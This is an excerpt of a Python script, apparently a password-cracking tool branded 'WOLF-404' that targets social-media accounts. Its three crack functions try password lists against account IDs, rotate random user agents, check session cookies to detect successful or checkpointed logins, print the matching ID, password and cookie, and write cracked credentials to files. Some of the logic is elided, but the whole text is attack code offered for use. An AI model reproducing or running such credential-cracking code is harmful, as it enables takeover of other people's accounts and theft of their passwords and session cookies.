...
def crack(idf,pwv,nmf):
    ...
    sys.stdout.write(f"\r {P}[WOLF-404] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[WOLF-404-CP] {idf}|{pw}')
                ...
                print(f'\r\33[92m[WOLF-404-OK] {idf}|{pw} | {kuki}')
...
def crack2(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[WOLF-404-CP] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
...
def crack3(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[WOLF_404 {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
